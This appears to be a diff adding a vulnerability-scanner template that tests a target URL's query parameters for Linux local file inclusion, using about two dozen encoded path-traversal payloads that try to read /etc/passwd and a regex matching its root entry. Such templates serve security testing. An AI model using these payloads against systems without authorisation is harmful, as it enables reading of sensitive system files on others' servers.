@@ -1,0 +1,51 @@
+id: lfi-linux
+
+info:
+  name: Linux LFI
+  author: shelled
+  severity: high
+  description: Generic Linux is subject to local file Inclusion on searches for /etc/passwd on passed URLs.
+  tags: linux,lfi,generic
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      injection:
+      - "/etc/passwd"
+      - "..%5cetc/passwd"
+      - "..%5c..%5cetc/passwd"
+      - "..%5c..%5c..%5cetc/passwd"
+      - "..%5c..%5c..%5c..%5cetc/passwd"
+      - "..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "./../../../../../../../../../../etc/passwd"
+      - "//....//....//....//....//....//....//....//....//....//etc/passwd"
+      - "%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd"
+      - "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd"
+      - ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd"
+      - "..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd"
+      - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+      - ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
+      - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+      - "..///////..////..//////etc/passwd"
+      - "%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
+      - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+      - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00"
+      - "../../../../../../../../../etc/passwd"
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
